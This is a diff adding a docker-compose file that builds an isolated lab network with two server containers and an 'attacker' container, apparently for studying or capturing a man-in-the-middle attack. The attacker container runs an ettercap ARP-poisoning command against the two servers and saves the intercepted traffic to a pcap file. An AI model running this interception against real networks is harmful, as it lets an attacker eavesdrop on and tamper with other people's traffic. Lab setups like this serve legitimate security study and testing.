@@ -1,0 +1,53 @@
+services:
+  server1:
+    privileged: true
+    build:
+      context: .
+      target: base
+      dockerfile: Dockerfile
+    image: mitm-attack-server:latest
+    pull_policy: never
+    container_name: server1
+    command: tail -f /dev/null
+    networks:
+      vm-net:
+        ipv4_address: 172.19.0.2
+
+  server2:
+    privileged: true
+    image: mitm-attack-server:latest
+    pull_policy: never
+    container_name: server2
+    command: tail -f /dev/null
+    networks:
+      vm-net:
+        ipv4_address: 172.19.0.3
+
+  attacker:
+    privileged: true
+    build:
+      context: .
+      target: attacker
+      dockerfile: Dockerfile
+    image: mitm-attack-attacker:latest
+    pull_policy: never
+    container_name: attacker
+    command: "timeout 60 ettercap -T -q -M arp:remote /172\\.19\\.0\\.2// /172\\.19\\.0\\.3// -w /root/dump/dump.pcap"
+    networks:
+      vm-net:
+        ipv4_address: 172.19.0.4
+    volumes:
+      - ./dump/:/root/dump/
+    depends_on:
+      - server1
+      - server2
+
+
+
+networks:
+  vm-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.19.0.0/16
+          gateway: 172.19.0.1
